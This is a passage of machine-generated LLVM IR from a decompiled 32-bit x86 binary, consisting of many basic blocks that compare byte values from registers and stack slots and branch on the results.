  %v6_804e71a429 = or i32 %v3_804e71a428, %v5_804e6fe
  %v7_804e71a430 = xor i32 %v6_804e71a429, 1
  store i32 %v7_804e71a430, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804e72f

dec_label_pc_804e717:                             ; preds = %dec_label_pc_804e70a
  %tmp140 = icmp ult i8 %v1_804e6fb, 5
  %v3_804e71a = zext i1 %tmp140 to i32
  %v6_804e71a = or i32 %v3_804e71a, %v5_804e6fe
  %v7_804e71a = xor i32 %v6_804e71a, 1
  store i32 %v7_804e71a, i32* %eax.global-to-local, align 4
  switch i8 %v1_804e6e0, label %dec_label_pc_804e72f [
    i8 -122, label %dec_label_pc_80503f6
    i8 -120, label %dec_label_pc_80503df
  ]

dec_label_pc_804e72f:                             ; preds = %dec_label_pc_804e717.thread, %dec_label_pc_80503f6, %dec_label_pc_80503df, %dec_label_pc_804e717
  %v11_804e72f = icmp eq i8 %v1_804e6e0, -118
  %v1_804e732 = zext i1 %v11_804e72f to i8
  %v2_804e732 = load i32, i32* @esp, align 4
  %v3_804e732 = add i32 %v2_804e732, 64
  %v4_804e732 = inttoptr i32 %v3_804e732 to i8*
  store i8 %v1_804e732, i8* %v4_804e732, align 1
  %v0_804e737 = load i32, i32* @esp, align 4
  %v1_804e737 = add i32 %v0_804e737, 64
  %v2_804e737 = inttoptr i32 %v1_804e737 to i8*
  %v3_804e737 = load i8, i8* %v2_804e737, align 1
  %v4_804e737 = icmp eq i8 %v3_804e737, 0
  br i1 %v4_804e737, label %dec_label_pc_804e74c, label %dec_label_pc_804e73e

dec_label_pc_804e73e:                             ; preds = %dec_label_pc_804e72f
  %v0_804e73e = load i32, i32* @ebx, align 4
  %v1_804e73e = trunc i32 %v0_804e73e to i8
  %v1_804e73e.off = add i8 %v1_804e73e, -13
  %tmp663 = icmp ult i8 %v1_804e73e.off, -75
  br i1 %tmp663, label %dec_label_pc_804e2d1, label %dec_label_pc_804e74c

dec_label_pc_804e74c:                             ; preds = %dec_label_pc_804e73e, %dec_label_pc_804e72f
  %v0_804e74c = load i32, i32* %ecx.global-to-local, align 4
  %v1_804e74c = trunc i32 %v0_804e74c to i8
  %v11_804e74c = icmp eq i8 %v1_804e74c, -117
  %v1_804e74f = zext i1 %v11_804e74c to i8
  %v3_804e74f = add i32 %v0_804e737, 63
  %v4_804e74f = inttoptr i32 %v3_804e74f to i8*
  store i8 %v1_804e74f, i8* %v4_804e74f, align 1
  %v0_804e754 = load i32, i32* @esp, align 4
  %v1_804e754 = add i32 %v0_804e754, 63
  %v2_804e754 = inttoptr i32 %v1_804e754 to i8*
  %v3_804e754 = load i8, i8* %v2_804e754, align 1
  %v4_804e754 = icmp ne i8 %v3_804e754, 0
  %v0_804e769.pre = load i32, i32* @ebx, align 4
  %.pre630 = trunc i32 %v0_804e769.pre to i8
  %v1_804e75b.off = add i8 %.pre630, -31
  %tmp664 = icmp ult i8 %v1_804e75b.off, 112
  %or.cond653 = and i1 %v4_804e754, %tmp664
  br i1 %or.cond653, label %dec_label_pc_804e2d1, label %dec_label_pc_804e769

dec_label_pc_804e769:                             ; preds = %dec_label_pc_804e74c
  %v4_804e769 = icmp eq i8 %.pre630, 0
  %v1_804e76b = icmp eq i1 %v4_804e769, false
  %v2_804e76b = zext i1 %v1_804e76b to i8
  %v4_804e76b = add i32 %v0_804e754, 62
  %v5_804e76b = inttoptr i32 %v4_804e76b to i8*
  store i8 %v2_804e76b, i8* %v5_804e76b, align 1
  %v0_804e770 = load i32, i32* %ecx.global-to-local, align 4
  %v1_804e770 = trunc i32 %v0_804e770 to i8
  %v11_804e770 = icmp eq i8 %v1_804e770, -116
  %v0_8050545 = load i32, i32* @esp, align 4
  br i1 %v11_804e770, label %dec_label_pc_8050545, label %dec_label_pc_804e779

dec_label_pc_804e779:                             ; preds = %dec_label_pc_804e769, %dec_label_pc_8050550, %dec_label_pc_8050545
  %v0_804e779 = load i32, i32* @ebx, align 4
  %v1_804e779 = trunc i32 %v0_804e779 to i8
  %tmp141 = icmp ugt i8 %v1_804e779, 44
  %v4_804e77c = zext i1 %tmp141 to i8
  %v6_804e77c = add i32 %v0_8050545, 61
  %v7_804e77c = inttoptr i32 %v6_804e77c to i8*
  store i8 %v4_804e77c, i8* %v7_804e77c, align 1
  %v0_804e781 = load i32, i32* %ecx.global-to-local, align 4
  %v1_804e781 = trunc i32 %v0_804e781 to i8
  switch i8 %v1_804e781, label %dec_label_pc_804e793 [
    i8 -113, label %dec_label_pc_805052c
    i8 -112, label %dec_label_pc_8050515
  ]

dec_label_pc_804e793:                             ; preds = %dec_label_pc_8050515, %dec_label_pc_804e779, %dec_label_pc_8050537, %dec_label_pc_805052c
  %v0_804e793 = load i32, i32* @esp, align 4
  %v1_804e793 = add i32 %v0_804e793, 98
  %v2_804e793 = inttoptr i32 %v1_804e793 to i8*
  %v3_804e793 = load i8, i8* %v2_804e793, align 1
  %v4_804e793 = icmp eq i8 %v3_804e793, 0
  br i1 %v4_804e793, label %dec_label_pc_804e7a8, label %dec_label_pc_804e79a

dec_label_pc_804e79a:                             ; preds = %dec_label_pc_804e793
  %v0_804e79a = load i32, i32* @ebx, align 4
  %v1_804e79a = trunc i32 %v0_804e79a to i8
  %v11_804e79f = icmp eq i8 %v1_804e79a, -91
  br i1 %v11_804e79f, label %dec_label_pc_804e2d1, label %dec_label_pc_804e7a8

dec_label_pc_804e7a8:                             ; preds = %dec_label_pc_804e79a, %dec_label_pc_804e793
  %v1_804e7a8 = add i32 %v0_804e793, 94
  %v2_804e7a8 = inttoptr i32 %v1_804e7a8 to i8*
  %v3_804e7a8 = load i8, i8* %v2_804e7a8, align 1
  %v4_804e7a8 = icmp eq i8 %v3_804e7a8, 0
  br i1 %v4_804e7a8, label %dec_label_pc_804e7bf, label %dec_label_pc_804e7af

dec_label_pc_804e7af:                             ; preds = %dec_label_pc_804e7a8
  %v1_804e7af = add i32 %v0_804e793, 65
  %v2_804e7af = inttoptr i32 %v1_804e7af to i8*
  %v3_804e7af = load i8, i8* %v2_804e7af, align 1
  %v4_804e7af = icmp eq i8 %v3_804e7af, 0
  br i1 %v4_804e7af, label %dec_label_pc_804e7bf, label %dec_label_pc_804e7b6

dec_label_pc_804e7b6:                             ; preds = %dec_label_pc_804e7af
  %v0_804e7b6 = load i32, i32* @ebx, align 4
  %v1_804e7b6 = trunc i32 %v0_804e7b6 to i8
  %tmp665 = icmp ult i8 %v1_804e7b6, 43
  br i1 %tmp665, label %dec_label_pc_804e2d1, label %dec_label_pc_804e7bf

dec_label_pc_804e7bf:                             ; preds = %dec_label_pc_804e7b6, %dec_label_pc_804e7af, %dec_label_pc_804e7a8
  %v0_804e7bf = load i32, i32* @ebx, align 4
  %v1_804e7bf = trunc i32 %v0_804e7bf to i8
  %tmp666 = icmp ugt i8 %v1_804e7bf, 102
  %v4_804e7c2 = zext i1 %tmp666 to i8
  %v6_804e7c2 = add i32 %v0_804e793, 60
  %v7_804e7c2 = inttoptr i32 %v6_804e7c2 to i8*
  store i8 %v4_804e7c2, i8* %v7_804e7c2, align 1
  %v0_804e7c7 = load i32, i32* @esp, align 4
  %v1_804e7c7 = add i32 %v0_804e7c7, 94
  %v2_804e7c7 = inttoptr i32 %v1_804e7c7 to i8*
  %v3_804e7c7 = load i8, i8* %v2_804e7c7, align 1
  %v4_804e7c7 = icmp eq i8 %v3_804e7c7, 0
  br i1 %v4_804e7c7, label %dec_label_pc_804e808, label %dec_label_pc_804e7ce

dec_label_pc_804e7ce:                             ; preds = %dec_label_pc_804e7bf
  %v1_804e7ce = add i32 %v0_804e7c7, 60
  %v2_804e7ce = inttoptr i32 %v1_804e7ce to i8*
  %v3_804e7ce = load i8, i8* %v2_804e7ce, align 1
  %v4_804e7ce = icmp ne i8 %v3_804e7ce, 0
  %v0_804e7de.pre = load i32, i32* @ebx, align 4
  %v1_804e7d5 = trunc i32 %v0_804e7de.pre to i8
  %tmp667 = icmp ult i8 %v1_804e7d5, 105
  %or.cond183 = and i1 %v4_804e7ce, %tmp667
  br i1 %or.cond183, label %dec_label_pc_804e2d1, label %dec_label_pc_804e7de

dec_label_pc_804e7de:                             ; preds = %dec_label_pc_804e7ce
  %tmp668 = icmp ugt i8 %v1_804e7d5, -89
  %tmp669 = or i8 %v1_804e7d5, 1
  %tmp670 = icmp eq i8 %tmp669, -87
  %or.cond185 = and i1 %tmp668, %tmp670
  br i1 %or.cond185, label %dec_label_pc_804e2d1, label %dec_label_pc_804e7ec

dec_label_pc_804e7ec:                             ; preds = %dec_label_pc_804e7de
  %tmp671 = icmp ugt i8 %v1_804e7d5, -59
  %tmp672 = icmp eq i8 %tmp669, -57
  %or.cond187 = and i1 %tmp671, %tmp672
  br i1 %or.cond187, label %dec_label_pc_804e2d1, label %dec_label_pc_804e7fa

dec_label_pc_804e7fa:                             ; preds = %dec_label_pc_804e7ec
  %tmp673 = icmp ugt i8 %v1_804e7d5, -19
  %v11_804e7ff = icmp eq i8 %v1_804e7d5, -1
  %v1_804e802 = icmp eq i1 %v11_804e7ff, false
  %or.cond188 = and i1 %tmp673, %v1_804e802
  br i1 %or.cond188, label %dec_label_pc_804e2d1, label %dec_label_pc_804e808

dec_label_pc_804e808:                             ; preds = %dec_label_pc_804e7fa, %dec_label_pc_804e7bf
  %v1_804e808 = add i32 %v0_804e7c7, 92
  %v2_804e808 = inttoptr i32 %v1_804e808 to i8*
  %v3_804e808 = load i8, i8* %v2_804e808, align 1
  %v4_804e808 = icmp eq i8 %v3_804e808, 0
  br i1 %v4_804e808, label %dec_label_pc_804e81d, label %dec_label_pc_804e80f

dec_label_pc_804e80f:                             ; preds = %dec_label_pc_804e808
  %v0_804e80f = load i32, i32* @ebx, align 4
  %v1_804e80f = trunc i32 %v0_804e80f to i8
  %tmp674 = icmp ugt i8 %v1_804e80f, 112
  %v1_804e80f.off = add i8 %v1_804e80f, -113
  %tmp675 = icmp ult i8 %v1_804e80f.off, 2
  %or.cond190 = and i1 %tmp674, %tmp675
  br i1 %or.cond190, label %dec_label_pc_804e2d1, label %dec_label_pc_804e81d

dec_label_pc_804e81d:                             ; preds = %dec_label_pc_804e80f, %dec_label_pc_804e808
  %v1_804e81d = add i32 %v0_804e7c7, 90
  %v2_804e81d = inttoptr i32 %v1_804e81d to i8*
  %v3_804e81d = load i8, i8* %v2_804e81d, align 1
  %v4_804e81d = icmp eq i8 %v3_804e81d, 0
  br i1 %v4_804e81d, label %dec_label_pc_804e832, label %dec_label_pc_804e824

dec_label_pc_804e824:                             ; preds = %dec_label_pc_804e81d
  %v0_804e824 = load i32, i32* @ebx, align 4
  %v1_804e824 = trunc i32 %v0_804e824 to i8
  %v1_804e824.off = add i8 %v1_804e824, 105
  %tmp676 = icmp ult i8 %v1_804e824.off, 4
  br i1 %tmp676, label %dec_label_pc_804e2d1, label %dec_label_pc_804e832

dec_label_pc_804e832:                             ; preds = %dec_label_pc_804e824, %dec_label_pc_804e81d
  %v0_804e832 = load i32, i32* %ecx.global-to-local, align 4
  %v1_804e832 = trunc i32 %v0_804e832 to i8
  %v11_804e832 = icmp eq i8 %v1_804e832, -103
  br i1 %v11_804e832, label %dec_label_pc_80504fe, label %dec_label_pc_804e83b

dec_label_pc_804e83b:                             ; preds = %dec_label_pc_80504fe, %dec_label_pc_804e832
  %v1_804e83b = add i32 %v0_804e7c7, 84
  %v2_804e83b = inttoptr i32 %v1_804e83b to i8*
  %v3_804e83b = load i8, i8* %v2_804e83b, align 1
  %v4_804e83b = icmp eq i8 %v3_804e83b, 0
  br i1 %v4_804e83b, label %dec_label_pc_804e86b, label %dec_label_pc_804e842

dec_label_pc_804e842:                             ; preds = %dec_label_pc_804e83b
  %v0_804e842 = load i32, i32* %eax.global-to-local, align 4
  %v3_804e842 = trunc i32 %v0_804e842 to i8
  %v4_804e842 = icmp ne i8 %v3_804e842, 0
  %v0_804e84f.pre = load i32, i32* @ebx, align 4
  %v1_804e846 = trunc i32 %v0_804e84f.pre to i8
  %tmp677 = icmp ult i8 %v1_804e846, 10
  %or.cond193 = and i1 %v4_804e842, %tmp677
  %v1_804e846.off = add i8 %v1_804e846, -74
  %tmp678 = icmp ult i8 %v1_804e846.off, 15
  %or.cond550 = or i1 %or.cond193, %tmp678
  %v1_804e846.off455 = add i8 %v1_804e846, 43
  %tmp679 = icmp ult i8 %v1_804e846.off455, 9
  %or.cond552 = or i1 %tmp679, %or.cond550
  br i1 %or.cond552, label %dec_label_pc_804e2d1, label %dec_label_pc_804e86b

dec_label_pc_804e86b:                             ; preds = %dec_label_pc_804e842, %dec_label_pc_804e83b
  %v1_804e86b = add i32 %v0_804e7c7, 88
  %v2_804e86b = inttoptr i32 %v1_804e86b to i8*
  %v3_804e86b = load i8, i8* %v2_804e86b, align 1
  %v4_804e86b = icmp eq i8 %v3_804e86b, 0
  br i1 %v4_804e86b, label %dec_label_pc_804e880, label %dec_label_pc_804e872

dec_label_pc_804e872:                             ; preds = %dec_label_pc_804e86b
  %v0_804e872 = load i32, i32* @ebx, align 4
  %v1_804e872 = trunc i32 %v0_804e872 to i8
  %v1_804e872.off = add i8 %v1_804e872, 106
  %tmp680 = icmp ult i8 %v1_804e872.off, 4
  br i1 %tmp680, label %dec_label_pc_804e2d1, label %dec_label_pc_804e880

dec_label_pc_804e880:                             ; preds = %dec_label_pc_804e872, %dec_label_pc_804e86b
  %v11_804e880 = icmp eq i8 %v1_804e832, -98
  %v1_804e883 = zext i1 %v11_804e880 to i32
  %v2_804e883 = load i32, i32* %eax.global-to-local, align 4
  %v3_804e883 = and i32 %v2_804e883, -256
  %v4_804e883 = or i32 %v3_804e883, %v1_804e883
  store i32 %v4_804e883, i32* %eax.global-to-local, align 4
  %v1_804e886 = add i32 %v0_804e7c7, 62
  %v2_804e886 = inttoptr i32 %v1_804e886 to i8*
  %v3_804e886 = load i8, i8* %v2_804e886, align 1
  %v4_804e886 = icmp eq i8 %v3_804e886, 0
  %v4_804e89a = icmp eq i1 %v11_804e880, false
  br i1 %v4_804e886, label %dec_label_pc_804e89a, label %dec_label_pc_804e88d

dec_label_pc_804e88d:                             ; preds = %dec_label_pc_804e880
  br i1 %v4_804e89a, label %dec_label_pc_804e8ac, label %dec_label_pc_804e891

dec_label_pc_804e891:                             ; preds = %dec_label_pc_804e88d
  %v0_804e891 = load i32, i32* @ebx, align 4
  %v1_804e891 = trunc i32 %v0_804e891 to i8
  %tmp681 = icmp ult i8 %v1_804e891, 21
  br i1 %tmp681, label %dec_label_pc_804e2d1, label %dec_label_pc_804e89e

dec_label_pc_804e89a:                             ; preds = %dec_label_pc_804e880
  br i1 %v4_804e89a, label %dec_label_pc_804e8ac, label %dec_label_pc_804e89a.dec_label_pc_804e89e_crit_edge

dec_label_pc_804e89a.dec_label_pc_804e89e_crit_edge: ; preds = %dec_label_pc_804e89a
  %v0_804e89e.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_804e89e

dec_label_pc_804e89e:                             ; preds = %dec_label_pc_804e89a.dec_label_pc_804e89e_crit_edge, %dec_label_pc_804e891
  %v0_804e89e = phi i32 [ %v0_804e89e.pre, %dec_label_pc_804e89a.dec_label_pc_804e89e_crit_edge ], [ %v0_804e891, %dec_label_pc_804e891 ]
  %v1_804e89e = trunc i32 %v0_804e89e to i8
  %v1_804e89e.off = add i8 %v1_804e89e, 21
  %tmp682 = icmp ult i8 %v1_804e89e.off, 12
  br i1 %tmp682, label %dec_label_pc_804e2d1, label %dec_label_pc_804e8ac

dec_label_pc_804e8ac:                             ; preds = %dec_label_pc_804e89e, %dec_label_pc_804e89a, %dec_label_pc_804e88d
  %v11_804e8ac = icmp eq i8 %v1_804e832, -97
  %v1_804e8af = zext i1 %v11_804e8ac to i32
  %v4_804e8af = or i32 %v3_804e883, %v1_804e8af
  store i32 %v4_804e8af, i32* %eax.global-to-local, align 4
  %v4_804e8b2 = icmp eq i1 %v11_804e8ac, false
  br i1 %v4_804e8b2, label %dec_label_pc_804e8c4, label %dec_label_pc_804e8b6

dec_label_pc_804e8b6:                             ; preds = %dec_label_pc_804e8ac
  %v0_804e8b6 = load i32, i32* @ebx, align 4
  %v1_804e8b6 = trunc i32 %v0_804e8b6 to i8
  %v10_804e8bb = icmp eq i8 %v1_804e8b6, 120
  br i1 %v10_804e8bb, label %dec_label_pc_804e2d1, label %dec_label_pc_804e8c4

dec_label_pc_804e8c4:                             ; preds = %dec_label_pc_804e8b6, %dec_label_pc_804e8ac
  %v8_804e8c4 = icmp eq i8 %v1_804e832, -96
  br i1 %v8_804e8c4, label %dec_label_pc_805055e, label %dec_label_pc_804e8cd

dec_label_pc_804e8cd:                             ; preds = %dec_label_pc_805055e, %dec_label_pc_804e8c4
  %v1_804e8cd = add i32 %v0_804e7c7, 72
  %v2_804e8cd = inttoptr i32 %v1_804e8cd to i8*
  %v3_804e8cd = load i8, i8* %v2_804e8cd, align 1
  %v4_804e8cd = icmp eq i8 %v3_804e8cd, 0
  br i1 %v4_804e8cd, label %dec_label_pc_804e8e2, label %dec_label_pc_804e8d4

dec_label_pc_804e8d4:                             ; preds = %dec_label_pc_804e8cd
  %v0_804e8d4 = load i32, i32* @ebx, align 4
  %v1_804e8d4 = trunc i32 %v0_804e8d4 to i8
  %v1_804e8d4.off = add i8 %v1_804e8d4, 32
  %tmp683 = icmp ult i8 %v1_804e8d4.off, 3
  br i1 %tmp683, label %dec_label_pc_804e2d1, label %dec_label_pc_804e8e2

dec_label_pc_804e8e2:                             ; preds = %dec_label_pc_804e8d4, %dec_label_pc_804e8cd
  %v1_804e8e2 = add i32 %v0_804e7c7, 86
  %v2_804e8e2 = inttoptr i32 %v1_804e8e2 to i8*
  %v3_804e8e2 = load i8, i8* %v2_804e8e2, align 1
  %v4_804e8e2 = icmp eq i8 %v3_804e8e2, 0
  br i1 %v4_804e8e2, label %dec_label_pc_804e8f9, label %dec_label_pc_804e8e9

dec_label_pc_804e8e9:                             ; preds = %dec_label_pc_804e8e2
  %v1_804e8e9 = add i32 %v0_804e7c7, 61
  %v2_804e8e9 = inttoptr i32 %v1_804e8e9 to i8*
  %v3_804e8e9 = load i8, i8* %v2_804e8e9, align 1
  %v4_804e8e9 = icmp eq i8 %v3_804e8e9, 0
  br i1 %v4_804e8e9, label %dec_label_pc_804e8f9, label %dec_label_pc_804e8f0

dec_label_pc_804e8f0:                             ; preds = %dec_label_pc_804e8e9
  %v0_804e8f0 = load i32, i32* @ebx, align 4
  %v1_804e8f0 = trunc i32 %v0_804e8f0 to i8
  %tmp684 = icmp ult i8 %v1_804e8f0, 47
  br i1 %tmp684, label %dec_label_pc_804e2d1, label %dec_label_pc_804e8f9

dec_label_pc_804e8f9:                             ; preds = %dec_label_pc_804e8f0, %dec_label_pc_804e8e9, %dec_label_pc_804e8e2
  %v11_804e8f9 = icmp eq i8 %v1_804e832, -93
  %v1_804e8fc = zext i1 %v11_804e8f9 to i8
  %v3_804e8fc = add i32 %v0_804e7c7, 59
  %v4_804e8fc = inttoptr i32 %v3_804e8fc to i8*
  store i8 %v1_804e8fc, i8* %v4_804e8fc, align 1
  %v0_804e901 = load i32, i32* @esp, align 4
  %v1_804e901 = add i32 %v0_804e901, 59
  %v2_804e901 = inttoptr i32 %v1_804e901 to i8*
  %v3_804e901 = load i8, i8* %v2_804e901, align 1
  %v4_804e901 = icmp eq i8 %v3_804e901, 0
  br i1 %v4_804e901, label %dec_label_pc_804e916, label %dec_label_pc_804e908

dec_label_pc_804e908:                             ; preds = %dec_label_pc_804e8f9
  %v0_804e908 = load i32, i32* @ebx, align 4
  %v1_804e908 = trunc i32 %v0_804e908 to i8
  %tmp685 = icmp ugt i8 %v1_804e908, -52
  %v1_804e908.off = add i8 %v1_804e908, 51
  %tmp686 = icmp ult i8 %v1_804e908.off, 2
  %or.cond201 = and i1 %tmp685, %tmp686
  br i1 %or.cond201, label %dec_label_pc_804e2d1, label %dec_label_pc_804e916

dec_label_pc_804e916:                             ; preds = %dec_label_pc_804e908, %dec_label_pc_804e8f9
  %v1_804e916 = add i32 %v0_804e901, 83
  %v2_804e916 = inttoptr i32 %v1_804e916 to i8*
  %v3_804e916 = load i8, i8* %v2_804e916, align 1
  %v4_804e916 = icmp eq i8 %v3_804e916, 0
  br i1 %v4_804e916, label %dec_label_pc_804e93b, label %dec_label_pc_804e91d

dec_label_pc_804e91d:                             ; preds = %dec_label_pc_804e916
  %v1_804e91d = add i32 %v0_804e901, 61
  %v2_804e91d = inttoptr i32 %v1_804e91d to i8*
  %v3_804e91d = load i8, i8* %v2_804e91d, align 1
  %v4_804e91d = icmp ne i8 %v3_804e91d, 0
  %v0_804e92d.pre = load i32, i32* @ebx, align 4
  %v1_804e924 = trunc i32 %v0_804e92d.pre to i8
  %tmp687 = icmp ult i8 %v1_804e924, 50
  %or.cond203 = and i1 %v4_804e91d, %tmp687
  %v1_804e924.off = add i8 %v1_804e924, 39
  %tmp688 = icmp ult i8 %v1_804e924.off, 16
  %or.cond554 = or i1 %or.cond203, %tmp688
  br i1 %or.cond554, label %dec_label_pc_804e2d1, label %dec_label_pc_804e93b

dec_label_pc_804e93b:                             ; preds = %dec_label_pc_804e91d, %dec_label_pc_804e916
  %v1_804e93b = add i32 %v0_804e901, 68
  %v2_804e93b = inttoptr i32 %v1_804e93b to i8*
  %v3_804e93b = load i8, i8* %v2_804e93b, align 1
  %v4_804e93b = icmp eq i8 %v3_804e93b, 0
  br i1 %v4_804e93b, label %dec_label_pc_804e950, label %dec_label_pc_804e942

dec_label_pc_804e942:                             ; preds = %dec_label_pc_804e93b
  %v0_804e942 = load i32, i32* @ebx, align 4
  %v1_804e942 = trunc i32 %v0_804e942 to i8
  %tmp689 = icmp ugt i8 %v1_804e942, -5
  %tmp690 = or i8 %v1_804e942, 1
  %tmp691 = icmp eq i8 %tmp690, -3
  %or.cond206 = and i1 %tmp689, %tmp691
  br i1 %or.cond206, label %dec_label_pc_804e2d1, label %dec_label_pc_804e950

dec_label_pc_804e950:                             ; preds = %dec_label_pc_804e942, %dec_label_pc_804e93b
  %v0_804e950 = load i32, i32* %ecx.global-to-local, align 4
  %v1_804e950 = trunc i32 %v0_804e950 to i8
  %v11_804e950 = icmp eq i8 %v1_804e950, -57
  %v1_804e953 = zext i1 %v11_804e950 to i8
  %v3_804e953 = add i32 %v0_804e901, 58
  %v4_804e953 = inttoptr i32 %v3_804e953 to i8*
  store i8 %v1_804e953, i8* %v4_804e953, align 1
  %v0_804e958 = load i32, i32* @esp, align 4
  %v1_804e958 = add i32 %v0_804e958, 58
  %v2_804e958 = inttoptr i32 %v1_804e958 to i8*
  %v3_804e958 = load i8, i8* %v2_804e958, align 1
  %v4_804e958 = icmp eq i8 %v3_804e958, 0
  br i1 %v4_804e958, label %dec_label_pc_804e96d, label %dec_label_pc_804e95f

dec_label_pc_804e95f:                             ; preds = %dec_label_pc_804e950
  %v0_804e95f = load i32, i32* @ebx, align 4
  %v1_804e95f = trunc i32 %v0_804e95f to i8
  %v1_804e95f.off = add i8 %v1_804e95f, -121
  %tmp692 = icmp ult i8 %v1_804e95f.off, -123
  br i1 %tmp692, label %dec_label_pc_804e2d1, label %dec_label_pc_804e96d

dec_label_pc_804e96d:                             ; preds = %dec_label_pc_804e95f, %dec_label_pc_804e950
  %v1_804e96d = add i32 %v0_804e958, 62
  %v2_804e96d = inttoptr i32 %v1_804e96d to i8*
  %v3_804e96d = load i8, i8* %v2_804e96d, align 1
  %v4_804e96d = icmp eq i8 %v3_804e96d, 0
  br i1 %v4_804e96d, label %dec_label_pc_804e97d, label %dec_label_pc_804e974

dec_label_pc_804e974:                             ; preds = %dec_label_pc_804e96d
  %v0_804e974 = load i32, i32* %ecx.global-to-local, align 4
  %v1_804e974 = trunc i32 %v0_804e974 to i8
  %v11_804e974 = icmp eq i8 %v1_804e974, -51
  br i1 %v11_804e974, label %dec_label_pc_8050575, label %dec_label_pc_804e97d

dec_label_pc_804e97d:                             ; preds = %dec_label_pc_8050575, %dec_label_pc_804e974, %dec_label_pc_804e96d
  %v1_804e97d = add i32 %v0_804e958, 77
  %v2_804e97d = inttoptr i32 %v1_804e97d to i8*
  %v3_804e97d = load i8, i8* %v2_804e97d, align 1
  %v4_804e97d = icmp eq i8 %v3_804e97d, 0
  br i1 %v4_804e97d, label %dec_label_pc_804e992, label %dec_label_pc_804e984

dec_label_pc_804e984:                             ; preds = %dec_label_pc_804e97d
  %v0_804e984 = load i32, i32* @ebx, align 4
  %v1_804e984 = trunc i32 %v0_804e984 to i8
  %tmp693 = icmp ugt i8 %v1_804e984, 59
  %tmp694 = or i8 %v1_804e984, 1
  %tmp695 = icmp eq i8 %tmp694, 61
  %or.cond209 = and i1 %tmp693, %tmp695
  br i1 %or.cond209, label %dec_label_pc_804e2d1, label %dec_label_pc_804e992

dec_label_pc_804e992:                             ; preds = %dec_label_pc_804e984, %dec_label_pc_804e97d
  %v0_804e992 = load i32, i32* %ecx.global-to-local, align 4
  %v1_804e992 = trunc i32 %v0_804e992 to i8
  %v10_804e992 = icmp eq i8 %v1_804e992, 104
  %v1_804e995 = zext i1 %v10_804e992 to i8
  %v3_804e995 = add i32 %v0_804e958, 57
  %v4_804e995 = inttoptr i32 %v3_804e995 to i8*
  store i8 %v1_804e995, i8* %v4_804e995, align 1
  %v0_804e99a = load i32, i32* @esp, align 4
  %v1_804e99a = add i32 %v0_804e99a, 70
  %v2_804e99a = inttoptr i32 %v1_804e99a to i8*
  %v3_804e99a = load i8, i8* %v2_804e99a, align 1
  %v4_804e99a = icmp eq i8 %v3_804e99a, 0
  br i1 %v4_804e99a, label %dec_label_pc_804e9b1, label %dec_label_pc_804e9a1

dec_label_pc_804e9a1:                             ; preds = %dec_label_pc_804e992
  %v1_804e9a1 = add i32 %v0_804e99a, 57
  %v2_804e9a1 = inttoptr i32 %v1_804e9a1 to i8*
  %v3_804e9a1 = load i8, i8* %v2_804e9a1, align 1
  %v4_804e9a1 = icmp eq i8 %v3_804e9a1, 0
  br i1 %v4_804e9a1, label %dec_label_pc_804e9b1, label %dec_label_pc_804e9a8

dec_label_pc_804e9a8:                             ; preds = %dec_label_pc_804e9a1
  %v0_804e9a8 = load i32, i32* @ebx, align 4
  %v1_804e9a8 = trunc i32 %v0_804e9a8 to i8
  %tmp696 = icmp ult i8 %v1_804e9a8, 31
  br i1 %tmp696, label %dec_label_pc_804e2d1, label %dec_label_pc_804e9b1

dec_label_pc_804e9b1:                             ; preds = %dec_label_pc_804e9a8, %dec_label_pc_804e9a1, %dec_label_pc_804e992
  %v0_804e9b1 = load i32, i32* %ecx.global-to-local, align 4
  %v1_804e9b1 = trunc i32 %v0_804e9b1 to i8
  %v11_804e9b1 = icmp eq i8 %v1_804e9b1, -68
  %v1_804e9b4 = zext i1 %v11_804e9b1 to i8
  %v3_804e9b4 = add i32 %v0_804e99a, 56
  %v4_804e9b4 = inttoptr i32 %v3_804e9b4 to i8*
  store i8 %v1_804e9b4, i8* %v4_804e9b4, align 1
  %v0_804e9b9 = load i32, i32* @esp, align 4
  %v1_804e9b9 = add i32 %v0_804e9b9, 56
  %v2_804e9b9 = inttoptr i32 %v1_804e9b9 to i8*
  %v3_804e9b9 = load i8, i8* %v2_804e9b9, align 1
  %v4_804e9b9 = icmp eq i8 %v3_804e9b9, 0
  br i1 %v4_804e9b9, label %dec_label_pc_804e9d2, label %dec_label_pc_804e9c0

dec_label_pc_804e9c0:                             ; preds = %dec_label_pc_804e9b1
  %v0_804e9c0 = load i32, i32* @ebx, align 4
  %v1_804e9c0 = trunc i32 %v0_804e9c0 to i8
  switch i8 %v1_804e9c0, label %dec_label_pc_804e9d2 [
    i8 -90, label %dec_label_pc_804e2d1
    i8 -30, label %dec_label_pc_804e2d1
  ]

dec_label_pc_804e9d2:                             ; preds = %dec_label_pc_804e9c0, %dec_label_pc_804e9b1
  %v0_804e9d2 = load i32, i32* %eax.global-to-local, align 4
  %v3_804e9d2 = trunc i32 %v0_804e9d2 to i8
  %v4_804e9d2 = icmp eq i8 %v3_804e9d2, 0
  br i1 %v4_804e9d2, label %dec_label_pc_804e9df, label %dec_label_pc_804e9d6

dec_label_pc_804e9d6:                             ; preds = %dec_label_pc_804e9d2
  %v0_804e9d6 = load i32, i32* @ebx, align 4
  %v1_804e9d6 = trunc i32 %v0_804e9d6 to i8
  %v11_804e9d6 = icmp eq i8 %v1_804e9d6, -53
  br i1 %v11_804e9d6, label %dec_label_pc_804e2d1, label %dec_label_pc_804e9df

dec_label_pc_804e9df:                             ; preds = %dec_label_pc_804e9d6, %dec_label_pc_804e9d2
  %v1_804e9df = add i32 %v0_804e9b9, 86
  %v2_804e9df = inttoptr i32 %v1_804e9df to i8*
  %v3_804e9df = load i8, i8* %v2_804e9df, align 1
  %v4_804e9df = icmp eq i8 %v3_804e9df, 0
  br i1 %v4_804e9df, label %dec_label_pc_804e9ef, label %dec_label_pc_804e9e6

dec_label_pc_804e9e6:                             ; preds = %dec_label_pc_804e9df
  %v0_804e9e6 = load i32, i32* @ebx, align 4
  %v1_804e9e6 = trunc i32 %v0_804e9e6 to i8
  %v11_804e9e6 = icmp eq i8 %v1_804e9e6, -13
  br i1 %v11_804e9e6, label %dec_label_pc_804e2d1, label %dec_label_pc_804e9ef

dec_label_pc_804e9ef:                             ; preds = %dec_label_pc_804e9e6, %dec_label_pc_804e9df
  %v0_804e9ef = load i32, i32* %ecx.global-to-local, align 4
  %v1_804e9ef = trunc i32 %v0_804e9ef to i8
  %v10_804e9ef = icmp eq i8 %v1_804e9ef, 45
  %v1_804e9f2 = zext i1 %v10_804e9ef to i8
  %v3_804e9f2 = add i32 %v0_804e9b9, 55
  %v4_804e9f2 = inttoptr i32 %v3_804e9f2 to i8*
